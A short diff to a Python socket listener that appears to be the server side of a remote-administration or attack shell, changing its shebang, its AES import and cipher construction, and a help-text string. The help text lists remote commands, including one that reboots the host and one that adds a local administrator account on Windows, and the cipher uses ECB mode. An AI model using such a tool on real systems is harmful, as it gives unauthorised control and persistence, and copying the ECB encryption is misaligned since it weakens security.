@@ -1,4 +1,4 @@
-#! /usr/bin/python3
+#!/usr/bin/env python
 from socket import *
 import os
 import threading
@@ -104,7 +104,7 @@ def start_listener():
     # specify it as nothing until we make it past our encryption check
     try:
 
-        from Cryptodome.Cipher import AES
+        from Crypto.Cipher import AES
 
         # set encryption key to 1
         encryption = 1
@@ -133,7 +133,7 @@ def start_listener():
         secret = os.urandom(BLOCK_SIZE)
 
         # create a cipher object using the random secret
-        cipher = AES.new(secret, AES.MODE_ECB)
+        cipher = AES.new(secret)
 
     # if it isn't import then trigger error and turn off encryption
     except ImportError:
@@ -391,7 +391,7 @@ Explanation: Reboots the remote server instantly.
 Example: reboot now""")
                     # if we're running under windows
                     if operating_system == "windows":
-                        print("""
+                        print(r"""
 Command: localadmin <username> <password>
 Explanation: adds a local admin to the system
 Example: localadmin bob p@55w0rd!
